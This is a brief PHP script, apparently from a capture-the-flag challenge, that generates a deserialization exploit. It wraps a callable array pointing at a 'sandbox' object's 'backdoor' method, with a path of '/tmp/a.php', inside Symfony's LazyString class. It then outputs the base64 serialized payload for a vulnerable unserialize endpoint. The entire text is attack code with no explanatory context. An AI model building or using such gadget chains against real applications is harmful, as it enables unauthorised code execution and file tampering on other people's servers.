<?php
namespace Symfony\Component\String {
    class LazyString {
        private $value;

        public function __construct($a)
        {
            $this->value = $a;
        }
    }
}

namespace {
	class sandbox {
		private $evil;
		
		public function __construct() {
			$this->evil = "/tmp/a.php";
		}
	}
	
	$cl = new \sandbox();
	$data = [$cl, "backdoor"];
    $exp = new \Symfony\Component\String\LazyString($data);

    var_dump(base64_encode(serialize($exp)));
	//var_dump(base64_encode(serialize(new sandbox)));
}